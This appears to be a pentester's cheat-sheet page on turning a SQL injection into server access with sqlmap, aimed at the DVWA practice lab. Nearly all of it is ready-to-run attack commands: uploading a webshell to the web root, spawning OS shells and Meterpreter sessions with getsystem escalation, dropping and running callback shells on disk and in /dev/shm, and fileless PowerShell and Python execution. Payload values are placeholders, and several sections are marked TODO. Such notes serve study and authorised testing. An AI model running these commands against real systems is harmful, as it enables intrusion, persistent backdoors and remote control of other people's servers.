---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - post-exploitation
  - server-side-attack
  - webshell
  - sqlmap
  - dvwa
---
# 01 - Webshell

> [!IMPORTANT] Conditions
> 1. The DB user must have **FILE** and **SELECT** privileges with the flags `--privileges -U CU`.
> 2. Find the web root directory using the enumeration methods.
> 3. The web root directory must have write permissions.

### 5.1.1 - Upload a specific Webshell

Refer to this [[Webshells Payloads|link]] to generate interactive weevely webshells and click [[07 - Tactics & Techniques & Procedures (TTPs) Phases/D - Webapp Pentesting/0x00 - Webshells/Weevely/Usage/00 - Help Menu|here]] for post exploitation section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
```

### 5.1.2 - Spawn an Interactive Webshell

TODO: Provide **\[INFO\]** logs to demonstrate a different between a file web stager (the uploader file) and a backdoor (an interactive shell)

Great thing about SQLMap that not only it uploads an interactive **web backdoor (the webshell)** it also comes with the **web file stager (the uploader)**.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-shell --web-root="/var/www/html/dvwa/"
```

### 5.1.3 - Spawn a Meterpreter Shell

Start a shell handler listener in Metasploit to retrieve a callback meterpreter session.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-pwn --web-root="/var/www/html/dvwa/"
```

> [!NOTE] GetSystem Privilege Escalation
> When using the `--priv-esc` flag this is for targeting Windows operating systems to automate using the `getsystem` function for impersonation.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --random-agent --os-pwn --web-root="/var/www/html/dvwa/" --priv-esc
```

### 5.1.4 - Execute OS Command

#### 5.1.4.1 - Cross Platform

Execute any command

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-cmd="whoami"
```

#### 5.1.4.2 - Linux

Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/tmp/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-cmd="python /tmp/shell.py"
```

Execute the callback shell in memory (fileless memory)

1. Copy the file in `/dev/shm/` directory

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/dev/shm/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-cmd="python /dev/shm/shell.py"
```

2. Execute a one liner

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-cmd="python -c <payload>"
```

#### 5.1.4.3 - Windows

TODO: Fill in this info to test a windows environment

- Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-write="/path/to/shell.exe" --file-dest="C:/windows/temp/shell.exe"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-cmd="cmd /c C:/windows/temp/shell.exe"
```

- Execute the callback shell in memory (fileless memory) via powershell

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-cmd="powershell -e <base64_encoded>"
```

- Execute the callback shell in memory (fileless memory) via python

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-cmd="python -c <payload>"
```

---
## References

### Backlinks

- [[02 - Webshell]]

### Hacking Articles

- [Hacking Articles: File System Access on Webserver Using SQLmap](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)

- [Hacking Articles: Shell uploading in Web Server using Sqlmap](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)

- [Hacking Articles: Command Injection Exploitation through Sqlmap in DVWA (OS-cmd)](https://www.hackingarticles.in/command-injection-exploitation-through-sqlmap-in-dvwa/)